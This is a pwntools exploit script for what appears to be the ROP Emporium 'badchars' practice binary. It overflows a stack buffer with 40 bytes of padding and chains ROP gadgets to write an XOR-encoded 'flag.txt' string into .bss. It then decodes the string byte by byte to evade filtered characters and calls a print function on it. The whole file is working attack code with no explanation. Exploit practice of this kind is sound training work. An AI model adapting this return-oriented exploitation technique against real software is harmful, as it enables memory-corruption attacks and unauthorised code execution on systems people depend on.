from pwn import *

def start():
        global chall
        if args.REMOTE:
                chall = remote('localhost', 1337)
        else:
                chall = elf.process()

context.binary = elf = ELF('./badchars')
start()

bss_addr = p64(0x601038)
mov_r13_r12 = p64(0x400634)             #: mov     [r13+0], r12
pop_r12_r13 = p64(0x40069c)   #: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rdi = p64(0x4006a3)       #: pop rdi ; ret
xor_r15 = p64(0x400628)       #: xor byte ptr [r15], r14b ; ret
flag_enc = bytes([i ^ 0xff for i in b'flag.txt'])
pop_r15 = p64(0x00000000004006a2)   #: pop r15 ; ret

print_addr = p64(0x400510)

## set_up bss
payload = b'A' * 40
payload += pop_r12_r13
payload += flag_enc
payload += bss_addr
payload += p64(0xffffffffffffffff)  # r14
payload += bss_addr  # r15
payload += mov_r13_r12

#bypass badchars
bss = 0x601038
for i in range(8):
    payload += pop_r15
    payload += p64(bss + i)
    payload += xor_r15


# print set up
payload += pop_rdi
payload += bss_addr
payload += print_addr




with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')

chall.sendlineafter(b'> ',payload)
p = chall.recvall(timeout = 0.2)
print(p)